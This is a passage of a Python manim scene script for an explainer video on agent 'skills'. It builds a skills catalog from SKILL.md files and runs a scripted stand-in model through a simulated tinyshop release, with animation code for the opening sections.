"""Agents, Animated · Episode 10 · Skills: Knowledge on Demand (Module 2 · Context Engineering)

How to give an agent expertise without bloating its context. Running example: Otto is asked to cut a
tinyshop release; the release procedure lives in a skill (skills/release/SKILL.md) that Otto loads only
for this task. The run is not drawn by hand: the scene builds the skills registry from the SKILL.md
files below, appends the catalog to the reference SYSTEM prompt, adds load_skill to TOOLS and
TOOL_HANDLERS, and runs the reference loop against a scripted stand-in for the model and in-memory
tools. The code on screen is the code that ran (asserted against this file).

Arc: hook (the release procedure Otto can't guess) · the problem (everything in the system prompt:
learn-claude-code s07's 2,000 + 1,500 + 3,000 = 6,500 lines, "99% irrelevant") · two levels (catalog
~100 tokens per skill every turn, body ~2,000 tokens on demand) · the file (folder, SKILL.md, YAML front
matter, body, references/ and scripts/; Li's three layers) · the harness (scan, catalog into SYSTEM,
load_skill handler; the loop unchanged) · the run (catalog match → load_skill → body as tool_result →
Otto follows the steps) · why a tool result (cached prefix, Episode 7) · descriptions as routing rules
· a skill is an instruction, not a permission boundary · progressive disclosure, and the link to
compaction (Episode 11) · recap.

Sources (facts dated October 2026):
- Learn Claude Code, s07 (learn.shareai.run/en/s07/): three docs = "6500 lines of system prompt",
  "99% of the content is irrelevant to the current task"; Level 1 catalog in the system prompt, ~100
  tokens per skill, carried every turn; Level 2 body returned as the load_skill tool_result, ~2,000
  tokens per skill, on demand; skills/<name>/SKILL.md with YAML frontmatter (name, description),
  optional references/, scripts/; "Inject via tool_result, not system prompt"; load_skill looks the name
  up in a registry (not the file system); on-demand loading solves "don't carry what you shouldn't",
  compact solves "how to drop what you should". (Dive into CC source, the site's reading, unverified:
  the skill listing is budgeted at ~1% of the context window, capped at 8,000 characters.)
- Li, AI Agents in Depth: ch. 2 (dynamic prompts and Agent Skills) — metadata block "similar to a
  book's copyright page", full SKILL.md loaded only when needed, sub-documents; descriptions should
  state "Use when" / "Do not use when"; "'help with backend' can activate on almost any backend task";
  Claude Code adds the body as a user message at the invocation point (the tool result is a
  placeholder) — either way it is appended at the end; "'KV Cache-friendly' does not mean 'zero
  cost'". ch. 10: "a Skill is an instruction, not a permission boundary". ch. 4 (tool ecosystem): a
  Skill that ships scripts "adds a whole class of risk"; judge it by code provenance, where it runs,
  sandboxing and approval (paraphrased on screen as "review it like code you're about to run").
  ch. 1: progressive disclosure is one of the book's five recurring patterns ("offer a searchable
  catalogue first and load the details on demand"); ch. 3: OpenViking's L0 ≈ 100 / L1 ≈ 2,000 tokens /
  L2 full text.

Illustrative (for teaching): tinyshop's four skills and their text, the release procedure, version
1.3.2 → 1.4.0, the model's choices in the run, the three routed tasks, the "never push to main" line
and the third-party setup script. Token sizes are learn-claude-code's estimates (~100 / ~2,000), the
6,500 lines its example; every other number is computed below and asserted.

    VOICE=draft manimgx inspect scene.py     # silent draft
    manimgx render scene.py                   # with the narrator serving from the series folder
"""

import json
import re
import sys
from pathlib import Path
from types import SimpleNamespace as NS

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from kit import *  # noqa: E402,F403

HERE = Path(__file__).resolve().read_text()
REF = (SERIES / "harness_reference.py").read_text()

# ---------------------------------------------------------------------------- learn-claude-code s07's numbers

GUIDES = [2000, 1500, 3000]  # lines of the three guides in s07's example
GUIDE_LINES = sum(GUIDES)
assert GUIDE_LINES == 6500  # "six thousand five hundred lines"
IRRELEVANT = 99  # "% of the content is irrelevant to the current task" (quoted)
CATALOG_TOKENS = 100  # ~ per skill, every turn (s07)
BODY_TOKENS = 2000  # ~ per skill, on demand (s07)

# ---------------------------------------------------------------------------- tinyshop's skills (illustrative)

RELEASE_MD = """---
name: release
description: Cut a tinyshop release. Use when
  asked to release or ship a version. Do not
  use for ordinary commits or bug fixes.
---
# Releasing tinyshop
1. Run pytest -q. Stop if anything fails.
2. Bump __version__ in tinyshop/__init__.py.
3. In CHANGELOG.md, rename Unreleased to it.
4. Tag it: git tag v<version>.
Hotfix? Read references/hotfix.md first.
"""
SQL_MD = """---
name: sql-style
description: tinyshop's SQL conventions. Use when
  writing or reviewing SQL.
---
# SQL style
Table names are plural and snake_case.
"""
API_MD = """---
name: api-design
description: Rules for tinyshop's REST endpoints.
  Use when adding or changing an endpoint.
---
# API design
Every endpoint returns JSON with an "error" key.
"""
REVIEW_MD = """---
name: code-review
description: tinyshop's review checklist. Use when
  asked to review a diff.
---
# Code review
Check tests, names and error handling.
"""
FILES = {
    "skills/release/SKILL.md": RELEASE_MD,
    "skills/release/references/hotfix.md": "# Hotfix releases\n",
    "skills/release/scripts/bump_version.py": "import re\n",
    "skills/sql-style/SKILL.md": SQL_MD,
    "skills/api-design/SKILL.md": API_MD,
    "skills/code-review/SKILL.md": REVIEW_MD,
}


def front_matter(md):
    """Split a SKILL.md into its YAML front matter (name, description) and its body."""
    _, head, body = md.split("---\n", 2)
    meta, key = {}, None
    for line in head.splitlines():
        if line.startswith("  ") and key:  # a folded continuation line
            meta[key] += " " + line.strip()
        else:
            key, _, value = line.partition(":")
            meta[key] = value.strip()
    return meta, body


def scan_skills(root):
    skills = {}
    for path, md in FILES.items():
        if re.fullmatch(rf"{root}/[^/]+/SKILL\.md", path):
            meta, body = front_matter(md)
            skills[meta["name"]] = {"description": meta["description"], "body": body}
    return skills


def catalog(skills):
    return "\n".join(f"- {name}: {s['description']}" for name, s in skills.items())


# ---------------------------------------------------------------------------- the harness (reference names)

SYSTEM = re.search(r'^SYSTEM = "(.*)"$', REF, re.M).group(1)
BASE_SYSTEM = SYSTEM
assert SYSTEM.startswith("You are Otto")
assert 'TOOL_HANDLERS = {"bash": run_bash, "read_file": read_file, "edit_file": edit_file}' in REF
TOOLS = [{"name": "bash"}, {"name": "read_file"}, {"name": "edit_file"}]  # schemas abridged (Episode 3)

REPO = {
    "tinyshop/__init__.py": '__version__ = "1.3.2"\n',
    "CHANGELOG.md": "# Changelog\n\n## Unreleased\n- cart.total() counts the last item\n",
}
TAGS = []


def run_bash(command):
    """tinyshop's shell, simulated (13 tests pass: the cart bug was fixed in Episodes 2 and 3)."""
    if command == "pytest -q":
        out = "13 passed"
    elif command.startswith("git tag "):
        TAGS.append(command.split()[-1])
        out = ""
    else:
        raise ValueError(command)
    return out or "(no output)"


def read_file(path):
    return REPO[path]


def edit_file(path, old_text, new_text):
    assert REPO[path].count(old_text) == 1
    REPO[path] = REPO[path].replace(old_text, new_text, 1)
    return f"edited {path}"


TOOL_HANDLERS = {"bash": run_bash, "read_file": read_file, "edit_file": edit_file}
LOAD_SKILL_SRC = """{
  "name": "load_skill",
  "description": "Load a skill by name.",
  "input_schema": {
    "type": "object",
    "properties": {
      "name": {"type": "string"}}}}"""
LOAD_SKILL = json.loads(LOAD_SKILL_SRC)

# ---- what Episode 10 adds (shown on screen; these exact lines run here) ----
SKILLS = scan_skills("skills")
SYSTEM += "\nSkills:\n" + catalog(SKILLS)

def load_skill(name):  # noqa: E302
    return SKILLS[name]["body"]

TOOLS.append(LOAD_SKILL)  # noqa: E305
TOOL_HANDLERS["load_skill"] = load_skill
# ---- end of what Episode 10 adds ----

ADD_SRC = '''SKILLS = scan_skills("skills")
SYSTEM += "\\nSkills:\\n" + catalog(SKILLS)

def load_skill(name):
    return SKILLS[name]["body"]

TOOLS.append(LOAD_SKILL)
TOOL_HANDLERS["load_skill"] = load_skill'''
assert all(line in HERE.split("# ---- what Episode 10 adds")[1] for line in ADD_SRC.split("\n") if line)
assert len(ADD_SRC.split("\n")) <= 10


def run_tool(block):
    return TOOL_HANDLERS[block.name](**block.input)


# The model's decisions in this run (illustrative): it matches the catalog, loads the skill, then
# follows the body's four steps in order.
NEW = "1.4.0"
PLAN = [
    ("load_skill", {"name": "release"}),
    ("bash", {"command": "pytest -q"}),
    ("edit_file", {"path": "tinyshop/__init__.py", "old_text": '"1.3.2"', "new_text": f'"{NEW}"'}),
    ("edit_file", {"path": "CHANGELOG.md", "old_text": "## Unreleased", "new_text": f"## {NEW}"}),
    ("bash", {"command": f"git tag v{NEW}"}),
    None,
]
TASK = f"Cut release v{NEW}."
FINAL = f"Released v{NEW}."


class ScriptedModel:
    """Stands in for client.messages: records what each call was sent."""

    def __init__(self):
        self.sent = []

    def create(self, system, messages, tools):
        self.sent.append((system, len(messages), [t["name"] for t in tools]))
        step = PLAN[len(self.sent) - 1]
        if step is None:
            return NS(stop_reason="end_turn", content=[NS(type="text", text=FINAL)])
        name, args = step
        block = NS(type="tool_use", id=f"toolu_{len(self.sent):02d}", name=name, input=args)
        return NS(stop_reason="tool_use", content=[block])


client = NS(messages=ScriptedModel())


def agent_loop(messages):  # harness_reference.agent_loop, unchanged
    while True:
        response = client.messages.create(system=SYSTEM, messages=messages, tools=TOOLS)
        messages.append({"role": "assistant", "content": response.content})
        if response.stop_reason != "tool_use":
            return response
        results = []
        for block in response.content:
            if block.type == "tool_use":
                output = run_tool(block)
                results.append({"type": "tool_result", "tool_use_id": block.id, "content": output})
        messages.append({"role": "user", "content": results})


MESSAGES = [{"role": "user", "content": TASK}]
ANSWER = agent_loop(MESSAGES)
SENT = client.messages.sent
RESULTS = [msg["content"][0]["content"] for msg in MESSAGES[2::2]]
CALLS = [msg["content"][0] for msg in MESSAGES[1:-1:2]]

# the run
RELEASE_META, RELEASE_BODY = front_matter(RELEASE_MD)
assert list(SKILLS) == ["release", "sql-style", "api-design", "code-review"]
N_SKILLS = len(SKILLS)
assert all(s[0] == SYSTEM for s in SENT) and all("load_skill" in s[2] for s in SENT)  # same prefix every call
assert f"- release: {RELEASE_META['description']}" in SYSTEM and RELEASE_BODY not in SYSTEM  # catalog in, body out
assert SYSTEM.startswith(BASE_SYSTEM)  # the catalog is appended once, at start-up
assert RESULTS[0] == RELEASE_BODY  # the body arrives as the first tool_result
assert [c.name for c in CALLS] == ["load_skill", "bash", "edit_file", "edit_file", "bash"]
assert [c.id for c in CALLS] == [msg["content"][0]["tool_use_id"] for msg in MESSAGES[2::2]]
assert RESULTS[1:] == ["13 passed", "edited tinyshop/__init__.py", "edited CHANGELOG.md", "(no output)"]
assert REPO["tinyshop/__init__.py"] == f'__version__ = "{NEW}"\n' and f"## {NEW}" in REPO["CHANGELOG.md"]
assert TAGS == [f"v{NEW}"] and ANSWER.content[0].text == FINAL
# the model followed the body's steps in order
_marks = ["pytest -q", "__version__", "CHANGELOG.md", "git tag"]
assert sorted(_marks, key=RELEASE_BODY.index) == _marks
assert len(SENT) == 6 and len(MESSAGES) == 12
# sizes (s07's per-skill estimates)
RESIDENT = N_SKILLS * CATALOG_TOKENS
LOADED = RESIDENT + BODY_TOKENS
EVERYTHING = N_SKILLS * BODY_TOKENS
assert (RESIDENT, LOADED, EVERYTHING) == (400, 2400, 8000)  # "four hundred", "two thousand", "eight thousand"
assert EVERYTHING // RESIDENT == 20

# ---------------------------------------------------------------------------- look

MODEL_ICON = recolored("llm", CORAL, CORAL_FILL, prefix="ep10")
GEAR_ICON = recolored("gear", MUTED, CARD_HI, prefix="ep10")
FLAT = set("abcdefhiklmnorstuvwxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
PANEL = "#18150F"

MD_T2C = {
    r"^---$": MUTED,
    r"^[a-z_]+(?=:)": AZURE,
    r"^#[^\n]*": SUN,
    r"^\d\.": SUN,
    r"Use when": MINT,
    r"Do not": ROSE,
}


def cite(s):
    return text(s, 20, MUTED)


def baseline(glyph_group, chars):
    """The baseline of a run of glyphs: the median bottom of its flat-bottomed letters."""
    bottoms = sorted(g.get_bottom()[1] for g, c in zip(glyph_group, chars) if c in FLAT)
    return bottoms[len(bottoms) // 2] if bottoms else glyph_group.get_bottom()[1]


def fmt(n):
    return f"{n:,}"


class Slot:
    """One place on screen whose content is swapped (a counter, a status line)."""

    def __init__(self, scene, current=None):
        self.scene, self.current = scene, current

    def to(self, new, shift=0.15):
        on_screen = {id(x) for x in self.scene.get_mobject_family_members()}
        anims = []
        if self.current is not None:
            out = m.FadeOut(self.current, shift=shift * m.UP)
            if id(self.current) not in on_screen:
                out.introducer = True
            anims.append(out)
        if new is not None:
            anims.append(m.FadeIn(new, shift=shift * m.UP))
        self.current = new
        return m.AnimationGroup(*anims) if anims else m.Wait(0.05)


class CodeCard:
    """A code card whose lines can be marked with a tinted bar (the ep02 cursor)."""

    def __init__(self, src, title=None, width=None, size=20, t2c=None):
        if t2c is None:
            block = code_block(src, size=size, width=width, title=title)
        else:  # markdown / YAML: same card, other colours
            body = code(src, size, INK, t2c=t2c)
            w = max(width or 0, body.width + 0.7)
            top = 0.0
            parts = []
            if title:
                cap = code(title, 20, MUTED)
                top = cap.height + 0.25
                parts.append(cap)
            box = card(w, body.height + 0.6 + top, EDGE, CARD, radius=0.16, stroke=2)
            body.move_to(box).align_to(box, m.LEFT).shift(0.35 * m.RIGHT)
            if title:
                body.shift(-top / 2 * m.UP)
                parts[0].align_to(box, m.UL).shift(0.35 * m.RIGHT + 0.18 * m.DOWN)
            block = m.VGroup(box, body, *parts)
        self.group = block
        self.box, self.body = block[0], block[1]
        self.cap = block[2] if title else None
        self.body.set_z_index(2)
        if self.cap is not None:
            self.cap.set_z_index(2)
        self.src = src.split("\n")
        self.lines, k = [], 0
        for line in self.src:
            n = sum(not c.isspace() for c in line)
            self.lines.append(self.body[k:k + n])
            k += n

    def base(self, i):
        return baseline(self.lines[i], self.src[i].replace(" ", ""))

    def part(self, i, key):
        line = self.src[i]
        start = line.index(key)
        skip = sum(c.isspace() for c in line[:start])
        width = sum(not c.isspace() for c in key)
        return self.lines[i][start - skip:start - skip + width]

    def bar(self, a, b=None, color=SUN):
        b = a if b is None else b
        top, bot = self.base(a) + 0.25, self.base(b) - 0.1
        left, right = self.box.get_left()[0] + 0.12, self.box.get_right()[0] - 0.1
        rect = m.Rectangle(width=right - left, height=top - bot, stroke_width=0, fill_color=color, fill_opacity=0.14)
        rect.move_to([(left + right) / 2, (top + bot) / 2, 0])
        mark = m.Rectangle(width=0.05, height=top - bot, stroke_width=0, fill_color=color, fill_opacity=1)
        mark.move_to([left + 0.025, (top + bot) / 2, 0])
        return m.VGroup(rect, mark).set_z_index(1)


class Column(ContextColumn):
    """The kit's ContextColumn; push() may fly the new message in from `source` (a mobject)."""

    def push(self, msg, run_time=0.9, source=None):
        room = self.top - self.bottom
        total = sum(item.height + self.gap for item, _ in self.slots) + msg.height
        leaving = []
        while self.slots and total > room + 1e-6:
            item, _ = self.slots.pop(0)
            leaving.append(item)
            total -= item.height + self.gap
        anims = []
        if leaving:
            rise = (self.top - self.slots[0][1]) if self.slots else room
            anims += [m.FadeOut(item, shift=rise * m.UP) for item in leaving]
            y = self.top
            for slot in self.slots:
                item = slot[0]
                anims.append(item.animate.move_to([item.get_x(), y - item.height / 2, 0]))
                slot[1] = y
                y -= item.height + self.gap
        y = (self.slots[-1][1] - self.slots[-1][0].height - self.gap) if self.slots else self.top
        msg.move_to([self.panel.get_x(), 0, 0]).align_to([0, y, 0], m.UP)
        anims.append(m.FadeIn(msg, shift=0.25 * m.UP) if source is None else m.FadeIn(msg, target_position=source))
        self.slots.append([msg, y])
        self.items = [item for item, _ in self.slots]
        return m.AnimationGroup(*anims, run_time=run_time)


def side_chip(pic, label, color, fill, width=2.5, height=0.85, size=24):
    box = card(width, height, color, fill, radius=0.18)
    body = m.VGroup(icon(pic, 0.52), text(label, size, INK, weight=m.SEMIBOLD)).arrange(m.RIGHT, buff=0.2).move_to(box)
    return m.VGroup(box, body)


def word_chip(word, color, fill, size=24, height=0.66, pad=0.55):
    return chip(word, color, fill, width=text(word, size, weight=m.SEMIBOLD).width + pad, height=height, size=size)


def mono_chip(word, color, fill, size=24, height=0.66, pad=0.5):
    return chip(word, color, fill, width=code(word, size - 4).width + pad, height=height, size=size, mono=True)


def short(line, n):
    return line if len(line) <= n else line[: n - 1].rstrip() + "…"


def doc_block(width, height, label, color=ORCHID, fill=ORCHID_FILL, size=20):
    box = m.RoundedRectangle(corner_radius=0.08, width=width, height=height, stroke_color=color, stroke_width=2,
                             fill_color=fill, fill_opacity=1)
    words = code(label, size, INK).move_to(box)
    return m.VGroup(box, words)


def strip_block(width, label, color, fill, height=0.8, size=22):
    box = card(width, height, color, fill, radius=0.12, stroke=2)
    words = code(label, size, INK).move_to(box)
    return m.VGroup(box, words)


def span_bracket(left, right, y, color, label, size=20, up=True):
    """A flat bracket from x=left to x=right at height y, with a label above (or below)."""
    s = 1 if up else -1
    line = m.VMobject().set_points_as_corners([[left, y - s * 0.14, 0], [left, y, 0], [right, y, 0], [right, y - s * 0.14, 0]])
    line.set_stroke(color, 3)
    words = code(label, size, color, weight=m.BOLD)
    words.next_to(line, m.UP if up else m.DOWN, buff=0.1)
    return m.VGroup(line, words)


# ---------------------------------------------------------------------------- the episode


class Ep10Skills(Episode):
    number = 10

    def lesson(self):
        self.hook()
        self.problem()
        self.two_levels()
        self.the_file()
        self.harness()
        self.run()
        self.why_tool_result()
        self.routing()
        self.caution()
        self.pattern()
        self.recap()

    # ------------------------------------------------------------------ hook

    def hook(self):
        self.next_section("Hook", notes=f"Otto (the series' agent) is asked to cut a tinyshop release ({TASK!r}). tinyshop has its own release procedure (from the skill body below): run the tests, bump the version, update the changelog, tag. Otto can't guess it: it has to be written down somewhere Otto will see it. Illustrative.")
        bot = otto(1.3).move_to([-5.0, 1.5, 0])
        person = icon("user", 0.95).move_to([5.75, 1.25, 0])
        ask = bubble(text(TASK, 28, INK), AZURE, AZURE_FILL, tail="right")
        ask.move_to([2.6, 1.95, 0])
        ask.shift((person.get_left()[0] - 0.15 - ask[0].get_vertices()[2][0]) * m.RIGHT)

        steps = ["pytest -q", "__version__", "CHANGELOG.md", f"git tag v{NEW}"]
        chips = m.VGroup(*[mono_chip(s, SUN, SUN_FILL, size=24, pad=0.55) for s in steps]).arrange(m.RIGHT, buff=0.62)
        chips.move_to([0.35, -0.95, 0])
        arrows = m.VGroup(*[arrow(a.get_right(), b.get_left(), MUTED, buff=0.08) for a, b in zip(chips, chips[1:])])
        nums = m.VGroup(*[code(f"{i}", 20, MUTED).next_to(c, m.UP, buff=0.18) for i, c in enumerate(chips, start=1)])
        cap = text("tinyshop's release procedure", 24, MUTED).next_to(chips, m.UP, buff=0.75)
        cap.align_to(chips, m.LEFT)
        what = m.VGroup(text("run the tests", 22, MUTED), text("bump the version", 22, MUTED),
                        text("update the changelog", 22, MUTED), text("tag it", 22, MUTED))
        for w, c in zip(what, chips):
            w.next_to(c, m.DOWN, buff=0.2)
        quiz = title_text("?", 64, SUN).next_to(bot, m.RIGHT, buff=0.35).shift(0.35 * m.UP)
        question = title_text("Where should this knowledge live?", 44, INK).move_to([0, -2.85, 0])

        self.say(
            "[Say you ask Otto to cut a new release of tinyshop.]",
            m.AnimationGroup(m.FadeIn(bot, shift=0.3 * m.UP), m.FadeIn(person, shift=0.2 * m.UP), m.FadeIn(ask, shift=0.2 * m.UP), lag_ratio=0.25),
        )
        self.say(
            "[Tinyshop has its own way of doing that]: [run the tests], [bump the version], [update the changelog], [and tag the release.]",
            m.FadeIn(cap, shift=0.1 * m.UP),
            m.AnimationGroup(m.FadeIn(chips[0], shift=0.2 * m.UP), m.FadeIn(nums[0]), m.FadeIn(what[0], shift=0.1 * m.UP)),
            *[m.AnimationGroup(m.GrowArrow(arrows[i - 1]), m.FadeIn(chips[i], shift=0.2 * m.UP), m.FadeIn(nums[i]), m.FadeIn(what[i], shift=0.1 * m.UP)) for i in (1, 2, 3)],
        )
        self.say(
            "[Otto can't guess those steps.] [So where should that knowledge live?]",
            m.AnimationGroup(m.FadeIn(quiz, scale=0.6), m.Circumscribe(m.VGroup(chips, what), color=MUTED, buff=0.15)),
            m.Write(question),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ the problem

    def problem(self):
        self.next_section("1 · Everything in the prompt", notes=f"learn-claude-code · s07: three guides of {', '.join(fmt(g) for g in GUIDES)} lines = '{fmt(GUIDE_LINES)} lines of system prompt', and '{IRRELEVANT}% of the content is irrelevant to the current task' — paid on every call, since the whole prompt is re-sent each turn (Episode 2). Block heights are proportional to the line counts (computed).")
        px, top, room = -4.3, 1.75, 4.75
        panel = card(3.4, room + 0.5, ORCHID, PANEL, radius=0.2, stroke=2.5).move_to([px, top - (room + 0.5) / 2 + 0.25, 0])
        title = code("system prompt", 22, ORCHID, weight=m.BOLD).next_to(panel, m.UP, buff=0.14).align_to(panel, m.LEFT)
        gap = 0.1
        unit = (room - gap * (len(GUIDES) - 1)) / GUIDE_LINES
        blocks, y = m.VGroup(), top
        for i, n in enumerate(GUIDES, start=1):
            h = n * unit
            b = doc_block(2.9, h, f"guide {i}\n{fmt(n)} lines", size=20)
            b.move_to([px, y - h / 2, 0])
            blocks.add(b)
            y -= h + gap

        total = title_text(f"{fmt(GUIDE_LINES)} lines", 76, ORCHID).move_to([2.35, 1.65, 0])
        sub = text("of system prompt", 28, MUTED).next_to(total, m.DOWN, buff=0.2)
        turns = m.VGroup()
        for k in range(6):
            mini = m.VGroup(*[
                m.RoundedRectangle(corner_radius=0.03, width=0.46, height=0.5 * n / max(GUIDES), stroke_width=0,
                                   fill_color=ORCHID, fill_opacity=0.85)
                for n in GUIDES
            ]).arrange(m.DOWN, buff=0.04)
            lab = code(f"turn {k + 1}", 20, MUTED)
            turns.add(m.VGroup(mini, lab).arrange(m.DOWN, buff=0.15))
        turns.arrange(m.RIGHT, buff=0.38, aligned_edge=m.DOWN).move_to([2.35, -0.45, 0])
        every = text("sent again on every turn", 24, MUTED).next_to(turns, m.DOWN, buff=0.25)
        quote = text(f"“{IRRELEVANT}% of the content is irrelevant\nto the current task.”", 30, INK)
        quote.move_to([2.35, -2.65, 0])
        sliver = m.Rectangle(width=2.9, height=0.1, stroke_width=0, fill_color=SUN, fill_opacity=1)
        sliver.move_to(blocks[0][0].get_top() + 0.18 * m.DOWN).set_z_index(3)

        self.say(
            "[The obvious move is to paste every guide into the system prompt.]",
            m.AnimationGroup(self.new_header("01 · the problem", "Everything in the prompt"), m.FadeIn(panel), m.FadeIn(title, shift=0.1 * m.UP)),
        )
        self.say(
            "[Learn Claude Code's example has three guides]: [two thousand lines], [fifteen hundred], [and three thousand.]",
            m.FadeIn(cite("learn-claude-code · s07").to_corner(m.UR, buff=0.5).shift(0.08 * m.DOWN)),
            *[m.FadeIn(b, shift=0.25 * m.DOWN) for b in blocks],
        )
        self.say(
            "[That's six thousand five hundred lines of system prompt], [sent again on every single turn.]",
            m.AnimationGroup(m.FadeIn(total, scale=0.85), m.FadeIn(sub, shift=0.1 * m.UP)),
            m.AnimationGroup(m.LaggedStart(*[m.FadeIn(t, target_position=panel, scale=0.4) for t in turns], lag_ratio=0.2), m.FadeIn(every)),
        )
        self.say(
            "[Yet for any one task], [ninety-nine percent of it is irrelevant.]",
            m.AnimationGroup(*[b.animate.set_opacity(0.3) for b in blocks], m.FadeIn(sliver)),
            m.FadeIn(quote, shift=0.1 * m.UP),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ two levels

    def two_levels(self):
        self.next_section("2 · Two levels", notes=f"learn-claude-code · s07: Level 1, a catalog in the system prompt (~{CATALOG_TOKENS} tokens per skill, carried every turn); Level 2, the body, returned by load_skill as a tool_result (~{fmt(BODY_TOKENS)} tokens per skill, on demand). tinyshop's {N_SKILLS} skills (illustrative): {N_SKILLS} × {CATALOG_TOKENS} = {RESIDENT} tokens every turn instead of {N_SKILLS} × {fmt(BODY_TOKENS)} = {fmt(EVERYTHING)} (computed; {EVERYTHING // RESIDENT}× less).")
        # level 1: the system prompt with the catalog
        sys_w = 6.6
        lines = [short(BASE_SYSTEM, 40), "Skills:"] + [short(l, 40) for l in catalog(SKILLS).split("\n")]
        body = code("\n".join(lines), 20, INK, t2c={r"^- [a-z-]+(?=:)": ORCHID, r"^Skills:": MUTED, r"^You[^\n]*": MUTED})
        label = code("system", 22, ORCHID, weight=m.BOLD)
        inner = m.VGroup(label, body).arrange(m.DOWN, aligned_edge=m.LEFT, buff=0.14)
        box = card(sys_w, inner.height + 0.45, EDGE, CARD, radius=0.12, stroke=1.5)
        stripe = m.RoundedRectangle(corner_radius=0.05, width=0.09, height=box.height - 0.16, stroke_width=0, fill_color=ORCHID, fill_opacity=1)
        sysmsg = m.VGroup(box, stripe, inner)
        stripe.move_to(box).align_to(box, m.LEFT).shift(0.1 * m.RIGHT)
        inner.move_to(box).align_to(box, m.LEFT).shift(0.32 * m.RIGHT)
        sysmsg.move_to([-3.35, 0.35, 0])
        cat_rows = m.VGroup(*[body[sum(len(x.replace(" ", "")) for x in lines[:i]):sum(len(x.replace(" ", "")) for x in lines[:i + 1])] for i in range(2, len(lines))])
        lvl1 = pill("level 1 · catalog", ORCHID, ORCHID_FILL, 22).next_to(sysmsg, m.UP, buff=0.22).align_to(sysmsg, m.LEFT)
        note1 = text(f"≈{CATALOG_TOKENS} tokens per skill · every turn", 24, MUTED).next_to(sysmsg, m.DOWN, buff=0.22).align_to(sysmsg, m.LEFT)

        # level 2: the bodies, on disk
        shelf = m.VGroup()
        for name in SKILLS:
            c = card(4.4, 0.56, EDGE, CARD, radius=0.12, stroke=1.5)
            words = code(f"{name}/SKILL.md", 20, INK).move_to(c).align_to(c, m.LEFT).shift(0.3 * m.RIGHT)
            shelf.add(m.VGroup(c, words))
        lvl2 = pill("level 2 · body", MINT, MINT_FILL, 22).move_to([0, lvl1.get_y(), 0]).align_to([2.1, 0, 0], m.LEFT)
        disk_t = code("on disk · skills/", 20, MUTED).next_to(lvl2, m.DOWN, buff=0.3).align_to(lvl2, m.LEFT)
        shelf.arrange(m.DOWN, buff=0.12).next_to(disk_t, m.DOWN, buff=0.18).align_to(lvl2, m.LEFT)
        note2 = text(f"≈{fmt(BODY_TOKENS)} tokens each · on demand", 24, MUTED).next_to(shelf, m.DOWN, buff=0.22).align_to(shelf, m.LEFT)
        src = cite("learn-claude-code · s07").to_corner(m.UR, buff=0.5).shift(0.08 * m.DOWN)

        # the comparison: every turn
        bw = 7.2
        m_all, m_cat = Meter(bw, 0.004, ROSE, 0.3), Meter(bw, 0.004, MINT, 0.3)
        m_all.move_to([0.9, -2.65, 0])
        m_cat.move_to([0.9, -3.35, 0])
        l_all = text("all bodies in the prompt", 24, INK).next_to(m_all, m.LEFT, buff=0.3)
        l_cat = text("catalog only", 24, INK).next_to(m_cat, m.LEFT, buff=0.3).align_to(l_all, m.RIGHT)
        v_all = code(f"{fmt(EVERYTHING)} tokens", 22, ROSE, weight=m.BOLD).next_to(m_all, m.RIGHT, buff=0.25)
        v_cat = code(f"{RESIDENT} tokens", 22, MINT, weight=m.BOLD).next_to(m_cat, m.RIGHT, buff=0.25)
        per_turn = code("per turn, 4 skills", 20, MUTED).next_to(m_all, m.UP, buff=0.18).align_to(m_all, m.RIGHT)

        self.say(
            "[Skills split that knowledge into two levels.]",
            m.AnimationGroup(self.new_header("02 · two levels", "A catalog now, the body later"), m.FadeIn(src)),
        )
        self.say(
            "[Level one is a catalog in the system prompt]: [one line per skill], [about a hundred tokens each, carried on every turn.]",
            m.AnimationGroup(m.FadeIn(lvl1, shift=0.1 * m.UP), m.FadeIn(sysmsg[:2]), m.FadeIn(label), m.FadeIn(body[:sum(len(x.replace(" ", "")) for x in lines[:2])])),
            m.LaggedStart(*[m.FadeIn(r, shift=0.15 * m.RIGHT) for r in cat_rows], lag_ratio=0.25),
            m.FadeIn(note1, shift=0.1 * m.UP),
        )
        self.say(
            "[Level two is the body], [about two thousand tokens], [kept out of the context until the model asks for it.]",
            m.AnimationGroup(m.FadeIn(lvl2, shift=0.1 * m.UP), m.FadeIn(disk_t)),
            m.LaggedStart(*[m.FadeIn(s, shift=0.15 * m.LEFT) for s in shelf], lag_ratio=0.2),
            m.FadeIn(note2, shift=0.1 * m.UP),
        )
        self.say(
            "[For four skills], [that's four hundred tokens every turn], [instead of eight thousand.]",
            m.AnimationGroup(m.FadeIn(m.VGroup(m_all.track, m_cat.track, l_all, l_cat)), m.FadeIn(per_turn), m.FadeIn(m_all.bar), m.FadeIn(m_cat.bar)),
            m.AnimationGroup(m_cat.fill_to(RESIDENT / EVERYTHING), m.FadeIn(v_cat, shift=0.1 * m.LEFT)),
            m.AnimationGroup(m_all.fill_to(0.999), m.FadeIn(v_all, shift=0.1 * m.LEFT)),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ the file

    def the_file(self):
        self.next_section("3 · The file", notes="learn-claude-code · s07: skills/<name>/SKILL.md with YAML frontmatter (name, description), optional references/ and scripts/. Li, AI Agents in Depth, ch. 2: three layers — the metadata block 'similar to a book's copyright page', the full SKILL.md body loaded only when needed, and sub-documents for deeper detail. tinyshop's release skill is illustrative.")
        tree = file_tree([
            "skills/", "skills/release/", "skills/release/SKILL.md", "skills/release/references/",
            "skills/release/references/hotfix.md", "skills/release/scripts/", "skills/release/scripts/bump_version.py",
            "skills/sql-style/", "skills/api-design/", "skills/code-review/",
        ], size=20, highlight=("SKILL.md",))
        tree.move_to([-4.45, -0.1, 0]).align_to([-6.6, 0, 0], m.LEFT)
        rows = {name: tree[i] for i, name in enumerate(["skills", "release", "SKILL", "references", "hotfix", "scripts", "bump", "sql", "api", "review"])}

        md = CodeCard(RELEASE_MD.rstrip("\n"), title="skills/release/SKILL.md", size=20, t2c=MD_T2C)
        md.group.move_to([2.95, -0.2, 0])
        n_head = RELEASE_MD.split("\n").index("---", 1)  # the closing --- of the front matter
        head_lines = m.VGroup(*md.lines[: n_head + 1])
        body_lines = m.VGroup(*md.lines[n_head + 1:])
        fm_bar = md.bar(0, n_head, color=ORCHID)
        body_bar = md.bar(n_head + 1, len(md.lines) - 1, color=MINT)
        ref_line = len(md.src) - 1
        assert md.src[ref_line].startswith("Hotfix?")

        layers = m.VGroup()
